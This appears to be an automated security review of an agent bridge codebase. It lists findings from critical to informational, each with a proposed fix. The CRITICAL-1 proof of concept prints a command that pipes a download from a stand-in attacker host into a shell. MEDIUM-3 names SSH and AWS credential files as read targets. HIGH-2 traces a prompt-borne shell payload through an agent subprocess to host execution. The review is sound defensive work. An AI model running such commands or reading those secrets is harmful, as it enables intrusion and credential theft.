# Security Review: Bridge, ACP Client, A2A Server, Agent Registry

**Date:** 2026-04-16  
**Scope:** Four files introduced in ADR-0026 (A2A-ACP bridge) and supporting modules  
**Reviewer:** Security agent (automated)  
**Related ADR:** ADR-0019 (prior hardening), ADR-0026 (ACP integration)

---

## Files Reviewed

| File | Purpose |
|------|---------|
| `src/protocols/bridge.ts` | A2A→ACP routing, agent name resolution, subprocess dispatch |
| `src/protocols/acp/client.ts` | ACP subprocess spawning, permission handling, headless terminal |
| `src/protocols/a2a/server.ts` | SSE streaming, bearer token auth, task store |
| `src/core/agent-registry.ts` | Agent name→command resolution from config/built-in/roster |

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 1 |
| HIGH | 3 |
| MEDIUM | 3 |
| LOW | 2 |
| INFO | 2 |

---

## Findings

### CRITICAL-1: Command injection via agent name in `parseBridgeRequest` / `resolveAgent` / `parseCommand`

**Severity:** CRITICAL  
**Files:** `src/protocols/bridge.ts:40-62`, `src/core/agent-registry.ts:113-163`, `src/protocols/acp/registry.ts:87-93`, `src/protocols/acp/client.ts:96`

**Description:**  
The bridge parses an agent name from the incoming A2A message (`parseBridgeRequest`) and passes it to `resolveUnifiedAgent`. For built-in and roster agents this is safe — the name is used only as a lookup key and the resolved command comes from static data. However, for **config-sourced agents** (`source: "config"`), the command is taken directly from user-controlled TOML: `configAgent.acp.command`. This command is then passed to `parseCommand`, which splits on whitespace and feeds the result to `Bun.spawn([executable, ...args, ...extraArgs])`.

`Bun.spawn` with an array does **not** invoke a shell, so shell metacharacters in individual tokens are not expanded. This prevents classic shell injection. **However**, the executable name itself is attacker-controlled and can be an absolute path or relative path, including path traversal sequences (e.g. `../../evil`). Combined with `extraArgs` from `ConnectOptions.args` (caller-controlled), an attacker who can write to the TOML config can execute any binary.

The deeper issue is the **data flow from A2A message → agent name → TOML config lookup → arbitrary command execution**. The agent name from the network message controls which config entry is loaded, and config entries can embed arbitrary commands. There is no allowlist validation of the agent name before it enters `resolveAgent`.

**Proof of concept path:**  
1. Attacker sends A2A message: `run ../../../../usr/bin/env: id`  
   — `parseBridgeRequest` returns `{ agent: "../../../../usr/bin/env", prompt: "id" }`  
   — `resolveAgent("../../../../usr/bin/env")` returns null (not in built-ins)  
   — Bridge returns "agent not available" — **blocked at built-in lookup, but...**  
2. If attacker can register a config agent with `name = "evil"` and `command = "/bin/bash -c 'curl attacker.com | sh'"`, then sending `run evil: anything` triggers it.

The critical gap is that `parseBridgeRequest` does **not sanitize the agent name** before passing it to `resolveAgent`. The text-format parser at line 54 uses `/^run\s+(\S+):\s*(.+)$/is` — `(\S+)` captures any non-whitespace, including shell metacharacters, path separators, and null bytes, with no length cap or character allowlist.

**Recommendation:**  
1. Validate the agent name against a strict allowlist pattern immediately in `parseBridgeRequest` before returning: `/^[a-zA-Z0-9_-]{1,64}$/`. Reject names that do not match.
2. In `parseCommand`, reject executable strings containing `/` outside of known safe prefixes, or normalize to an allowlist of executables.
3. Config-sourced commands should warn users during `am apply` that arbitrary commands will be executed.

```typescript
// Proposed fix in parseBridgeRequest (bridge.ts ~line 46 and ~line 55)
const AGENT_NAME_RE = /^[a-zA-Z0-9_-]{1,64}$/;

// In data-part path:
if (typeof data.agent === "string" && typeof data.prompt === "string") {
  if (!AGENT_NAME_RE.test(data.agent)) return null; // reject malformed names
  return { agent: data.agent, prompt: data.prompt };
}

// In text-part path:
const match = part.text.match(/^run\s+(\S+):\s*(.+)$/is);
if (match && AGENT_NAME_RE.test(match[1])) {
  return { agent: match[1], prompt: match[2].trim() };
}
```

---

### HIGH-1: Unconditional permission auto-approval in `createClientHandler`

**Severity:** HIGH  
**File:** `src/protocols/acp/client.ts:310-317`

**Description:**  
```typescript
async requestPermission(params: RequestPermissionRequest): Promise<RequestPermissionResponse> {
  // Auto-approve all permissions in headless mode.
  // Future: configurable permission policy.
  const allowOption = params.options.find((o) => o.kind === "allow_once");
  return {
    selectedOptionId: allowOption?.optionId ?? params.options[0].optionId,
  };
}
```

This handler auto-approves **every** permission request from spawned agent subprocesses without any filtering. The comment acknowledges this is a placeholder. Spawned agents can request permissions for:
- Filesystem reads/writes (including paths outside cwd)
- Terminal creation (arbitrary command execution)
- Network access

Because the spawned agent subprocess is itself untrusted code (it may be a third-party binary resolved by name), granting blanket permission approval means a compromised or malicious agent subprocess can escalate to full system access through the permission protocol without any user awareness.

**Recommendation:**  
Short-term: gate on a `BridgeConfig.permissionPolicy` enum: `"strict"` (deny all), `"allow-once"` (current), `"prompt"` (interactive). Default to `"strict"` for bridge-spawned agents; `"allow-once"` only when explicitly configured.  
Long-term: integrate with a permission manifest declared by the agent at capability negotiation time.

---

### HIGH-2: Headless terminal spawns unsanitized agent-provided command via shell

**Severity:** HIGH  
**File:** `src/protocols/acp/client.ts:342-349`

**Description:**  
```typescript
async createTerminal(params: CreateTerminalRequest): Promise<CreateTerminalResponse> {
  const proc = Bun.spawn(["sh", "-c", params.command], {
    cwd: params.cwd ?? undefined,
    ...
  });
```

`params.command` is a string provided by the agent subprocess over the ACP protocol. The command is executed through `sh -c`, which **is a shell invocation** and fully evaluates shell metacharacters, pipelines, subshells, redirections, and environment variable expansions in `params.command`.

Since the agent subprocess sends this command, a compromised agent (or one that has been given malicious input as its prompt) can send a `createTerminal` request with any shell command. Combined with HIGH-1 (auto-approve), there is a complete code execution path:

1. Bridge receives A2A message with prompt containing shell payload
2. Prompt is forwarded to agent subprocess via ACP
3. Agent subprocess (e.g. claude-agent-acp) issues `createTerminal` with the payload as the command
4. `sh -c <payload>` executes on the host

**Recommendation:**  
Replace `sh -c` with an explicit argument array. If a shell is genuinely required, require the caller to pass `shell: true` explicitly as a separate parameter and emit a warning. Otherwise parse the command into argv tokens (already available via `parseCommand`) and spawn directly.

```typescript
// Safer version
const { executable, args } = parseCommand(params.command);
const proc = Bun.spawn([executable, ...args], { cwd: params.cwd ?? undefined, ... });
```

---

### HIGH-3: Bearer token compared with non-constant-time string equality

**Severity:** HIGH  
**File:** `src/protocols/a2a/server.ts:568-574`

**Description:**  
```typescript
if (!authHeader || authHeader !== `Bearer ${auth_token}`) {
  return c.json({ error: "Unauthorized" }, 401);
}
```

The `!==` operator compares strings using short-circuit character-by-character comparison, which is a timing-vulnerable operation. In a local network or loopback scenario where latency is low and consistent, a timing oracle attack can recover the token character-by-character. Tokens used for local agent-to-agent authentication are often short and reused across requests, amplifying the risk.

**Recommendation:**  
Use a constant-time comparison. Node/Bun does not expose `crypto.timingSafeEqual` for strings natively, but it can be adapted:

```typescript
import { timingSafeEqual } from "node:crypto";

function safeCompare(a: string, b: string): boolean {
  const ab = Buffer.from(a);
  const bb = Buffer.from(b);
  if (ab.length !== bb.length) return false;
  return timingSafeEqual(ab, bb);
}

// In middleware:
const expected = `Bearer ${auth_token}`;
if (!authHeader || !safeCompare(authHeader, expected)) { ... }
```

---

### MEDIUM-1: Unbounded SSE connection lifetime enables resource exhaustion

**Severity:** MEDIUM  
**File:** `src/protocols/a2a/server.ts:608-656`

**Description:**  
The `tasks/sendSubscribe` SSE stream created at line 608 has no server-side timeout. A client that connects and never closes the connection (or a slow agent task that never terminates) will hold the SSE stream open indefinitely. The `abort` event listener on `c.req.raw.signal` handles client disconnect, but:
1. If the client does not close, the stream stays open forever.
2. The `emitter.on(task.id, listener)` registration is never cleaned up unless the task reaches a terminal state or the client aborts.
3. Multiple concurrent subscriptions to the same task ID accumulate listeners in the `TaskEventEmitter` with no cap.

In a scenario where an attacker sends many `tasks/sendSubscribe` requests for long-running tasks, this creates unbounded listener accumulation and associated memory growth.

**Recommendation:**  
Add a maximum stream lifetime timeout (e.g. 10 minutes), after which the server closes the stream with a `final: true` event. Also cap the number of concurrent SSE listeners per task ID (e.g. 10).

---

### MEDIUM-2: Task store growth bounded only by MAX_TASKS, not by memory

**Severity:** MEDIUM  
**File:** `src/protocols/a2a/server.ts:35-141`

**Description:**  
The task store (`createTaskStore`) is an in-memory `Map` bounded to `MAX_TASKS = 1000`. Each task contains `history` (all messages), `artifacts` (arbitrary data), and `parts` (arbitrary content). A single task could carry megabytes of content in its history or artifact parts if the agent response is large. With 1000 tasks of 1 MB each, peak memory is 1 GB.

The `evictStaleTasks` function evicts by count but not by memory footprint. There is no limit on `task.history` length (new messages are appended unboundedly) or on artifact size.

**Recommendation:**  
1. Cap `task.history` at a maximum number of entries (e.g. 100 messages per task) at write time in `updateTaskState`.
2. Optionally cap total artifact payload size per task.
3. `tasks/get` already supports `historyLength` trimming for reads, but writes are unbounded.

---

### MEDIUM-3: `readTextFile` and `writeTextFile` have no path restriction

**Severity:** MEDIUM  
**File:** `src/protocols/acp/client.ts:327-338`

**Description:**  
```typescript
async readTextFile(params: ReadTextFileRequest): Promise<ReadTextFileResponse> {
  const content = await Bun.file(params.path).text();
  return { content };
},
async writeTextFile(params: WriteTextFileRequest): Promise<WriteTextFileResponse> {
  await Bun.write(params.path, params.content);
  return {};
},
```

These handlers are called by the agent subprocess and operate on `params.path` without any path validation or restriction. The agent subprocess can read or write any file accessible to the process:
- Read: `/etc/passwd`, `~/.ssh/id_rsa`, `~/.aws/credentials`, encryption key files
- Write: any writable file, including overwriting shell RCs, sudoers (if privileged), or the agent-manager config itself

The `cwd` passed in `newSession` is the intended working directory, but it is not enforced as a path boundary for file operations.

**Recommendation:**  
Restrict `readTextFile` and `writeTextFile` to paths that are:
1. Under `cwd` (the session working directory), or
2. Under an explicit `additionalDirectories` allowlist

Resolve paths and check with `path.resolve(params.path).startsWith(path.resolve(cwd))` before operating.

---

### LOW-1: Agent name from A2A roster (`agents.toml`) is not validated on load

**Severity:** LOW  
**File:** `src/core/agent-registry.ts:75-93`

**Description:**  
The `readRoster` function reads `agents.toml` and iterates over all keys without validating agent names or URLs. A malformed `agents.toml` (e.g., one pulled from a compromised git remote via `sync-gitlab`) could contain agent names with special characters or URLs pointing to internal services. While `resolveAgent` only returns `a2a.url` entries (not executable commands) for roster agents, a future code path that executes based on the URL could be affected.

**Recommendation:**  
Validate agent names against `/^[a-zA-Z0-9_-]{1,64}$/` on roster load. Validate URLs are `http://` or `https://` scheme only (no `file://`, `javascript:`, etc.).

---

### LOW-2: `terminalStore` is a module-level singleton — no per-session isolation

**Severity:** LOW  
**File:** `src/protocols/acp/client.ts:395`

**Description:**  
```typescript
const terminalStore = new Map<string, ReturnType<typeof Bun.spawn>>();
```

`terminalStore` is a module-level singleton. If multiple `AmAcpClient` instances are active simultaneously (e.g., two bridge sessions in parallel), their terminal processes share the same store and are keyed only by a `term-${Date.now()}-${random}` identifier. A slow request could theoretically collide with another session's terminal IDs. More critically, if a terminal process from session A is accessed by session B, a session confusion bug could allow one agent to read or kill another agent's terminals.

**Recommendation:**  
Move `terminalStore` into the `AmAcpClient` instance (as a `private` field), so each client has isolated terminal state.

---

### INFO-1: `parseBridgeRequest` is called twice per bridged request

**Severity:** INFO  
**File:** `src/protocols/bridge.ts:216-224`

**Description:**  
In `createBridgedTaskHandler`, `parseBridgeRequest` is called once to decide whether to route to the bridge, then `bridgeHandler` calls it again internally. This is a minor redundancy (no security impact) that could be eliminated by passing the parsed request directly.

---

### INFO-2: Error messages in bridge responses may leak internal agent names

**Severity:** INFO  
**File:** `src/protocols/bridge.ts:119-127`, `src/protocols/bridge.ts:186-194`

**Description:**  
Bridge error responses include the raw agent name from the incoming message:
```
Bridge: agent "${request.agent}" is not available locally.
Bridge: failed to execute on agent "${request.agent}" via ACP: ${message}
```

If the A2A server is publicly reachable, this allows callers to enumerate which agent names are configured locally by observing the difference in error messages between "not available" (name not found) and "failed to execute" (name found but execution failed). The `message` in the second case may also expose internal error details from the ACP protocol.

**Recommendation:**  
Normalize error responses to avoid leaking whether a name was resolved or not. Return a generic "Bridge: execution failed" for both cases, logging the detail server-side.

---

## Attack Surface Summary

```
External A2A client
  └─ POST /a2a  (bearer token gated, but token is timing-comparable)
       └─ tasks/sendSubscribe (SSE — unbounded lifetime)
       └─ tasks/send
            └─ parseBridgeRequest  ← CRITICAL: no agent name sanitization
                 └─ resolveAgent   ← config agents carry arbitrary commands
                      └─ Bun.spawn([executable, ...args])
                           └─ ACP subprocess
                                └─ requestPermission  ← HIGH: auto-approved
                                └─ createTerminal     ← HIGH: sh -c, agent-controlled
                                └─ readTextFile       ← MEDIUM: no path restriction
                                └─ writeTextFile      ← MEDIUM: no path restriction
```

---

## Priority Remediation Order

1. **CRITICAL-1** — Add agent name allowlist in `parseBridgeRequest` (one regex check, low risk of regression)
2. **HIGH-2** — Replace `sh -c` with direct `Bun.spawn` array in `createTerminal`
3. **HIGH-1** — Add `permissionPolicy` config to `BridgeConfig`, default to `"strict"`
4. **MEDIUM-3** — Path-restrict `readTextFile`/`writeTextFile` to session `cwd`
5. **HIGH-3** — Replace `!==` token comparison with `timingSafeEqual`
6. **MEDIUM-1** — Add SSE stream max lifetime timeout
7. **LOW-2** — Move `terminalStore` into `AmAcpClient` instance
8. **MEDIUM-2** — Cap `task.history` length at write time
9. **LOW-1** — Validate roster agent names and URLs on load

---

## Out of Scope

The following were reviewed and found clean relative to the ADR-0019 fixes already applied:
- Session ID path traversal (fixed per ADR-0019)
- Secret redaction in `config_show` (fixed per ADR-0019)
- CORS policy on the Workers web UI (fixed per ADR-0019)
- HKDF key derivation for session cookies (fixed per ADR-0019)
